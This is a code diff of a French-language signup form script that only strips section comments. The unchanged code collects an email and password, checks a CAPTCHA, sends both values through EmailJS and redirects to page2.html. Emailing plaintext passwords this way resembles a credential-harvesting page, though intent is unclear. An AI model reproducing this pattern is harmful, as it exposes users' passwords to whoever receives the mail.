@@ -8,9 +8,7 @@ emailjs.init({
 });
 
 
-// ======================================
-// Éléments HTML
-// ======================================
+
 
 const form = document.getElementById("signupForm");
 
@@ -23,9 +21,6 @@ const result = document.getElementById("result");
 let captchaShown = false;
 
 
-// ======================================
-// Limites des champs
-// ======================================
 
 emailInput.addEventListener("input", function () {
     this.value = this.value.slice(0, 50);
@@ -35,18 +30,13 @@ passwordInput.addEventListener("input", function () {
     this.value = this.value.slice(0, 20);
 });
 
-// ======================================
-// SUBMIT
-// ======================================
+
 
 form.addEventListener("submit", async function (event) {
 
     event.preventDefault();
 
 
-    // ------------------------------
-    // Vérification HTML
-    // ------------------------------
 
     if (!form.checkValidity()) {
         form.reportValidity();
@@ -54,10 +44,7 @@ form.addEventListener("submit", async function (event) {
     }
 
 
-    // ------------------------------
-    // Premier clic :
-    // afficher le CAPTCHA
-    // ------------------------------
+    
 
     if (!captchaShown) {
 
@@ -72,9 +59,7 @@ form.addEventListener("submit", async function (event) {
     }
 
 
-    // ------------------------------
-    // Vérification CAPTCHA
-    // ------------------------------
+  
 
     if (
         typeof grecaptcha === "undefined" ||
@@ -96,17 +81,13 @@ form.addEventListener("submit", async function (event) {
     }
 
 
-    // ------------------------------
-    // Récupération des données
-    // ------------------------------
+    
 
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
 
-    // ------------------------------
-    // Paramètres EmailJS
-    // ------------------------------
+ 
 
     const templateParams = {
         email: email,
@@ -114,9 +95,6 @@ form.addEventListener("submit", async function (event) {
     };
 
 
-    // ------------------------------
-    // Envoi EmailJS
-    // ------------------------------
 
     result.textContent = "Envoi en cours...";
     result.className = "";
@@ -148,9 +126,7 @@ form.addEventListener("submit", async function (event) {
         captchaShown = false;
 
 
-        // ------------------------------
-        // Redirection après envoi réussi
-        // ------------------------------
+       
 
         window.location.href = "page2.html";
 
